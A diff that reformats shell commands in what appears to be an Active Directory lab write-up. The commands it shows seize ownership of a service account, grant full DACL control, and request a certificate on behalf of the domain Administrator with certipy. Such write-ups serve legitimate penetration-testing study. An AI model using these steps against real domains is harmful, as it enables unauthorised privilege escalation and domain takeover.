@@ -358,8 +358,7 @@ Exegol ➜ /workspace 𝘹 bloodyAD -u 'mitch.r' -p '[REDACTED]' -d shadowgate.l
 `milo.w` doesn't own `svc_mssql` by default, so ownership has to be seized before a DACL can be written. First, take ownership using the `WriteOwner` edge:
 
 ```bash
-Exegol ➜ /workspace 𝘹 owneredit.py -action write -new-owner 'milo.w' -target 'svc_mssql' \
-    'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
+Exegol ➜ /workspace 𝘹 owneredit.py -action write -new-owner 'milo.w' -target 'svc_mssql' 'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
 [*] Current owner information below
 [*] - SID: S-1-5-21-2396436576-3267128377-3646372360-512
 [*] - sAMAccountName: Domain Admins
@@ -369,8 +368,7 @@ Exegol ➜ /workspace 𝘹 owneredit.py -action write -new-owner 'milo.w' -targe
 Then grant `milo.w` full control via a DACL write:
 
 ```bash
-Exegol ➜ /workspace 𝘹 dacledit.py -action write -rights FullControl -principal 'milo.w' -target 'svc_mssql' \
-    'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
+Exegol ➜ /workspace 𝘹 dacledit.py -action write -rights FullControl -principal 'milo.w' -target 'svc_mssql' 'shadowgate.local/milo.w:[REDACTED]' -dc-ip 10.1.104.4
 [*] DACL backed up to dacledit-[timestamp].bak
 [*] DACL modified successfully!
 ```
@@ -732,12 +730,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 With a valid Enrollment Agent certificate, request a certificate **on behalf of** Administrator against the `User` template:
 
 ```bash
-Exegol ➜ /workspace 𝘹 certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ldap-scheme ldap \
-  -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local \
-  -template User \
-  -on-behalf-of 'shadowgate\administrator' \
-  -pfx sam.h.pfx \
-  -dynamic-endpoint
+Exegol ➜ /workspace 𝘹 certipy req -u 'sam.h@shadowgate.local' -p '[REDACTED]' -dc-ip 10.1.104.4 -ldap-scheme ldap -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local -template User -on-behalf-of 'shadowgate\administrator' -pfx sam.h.pfx -dynamic-endpoint
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
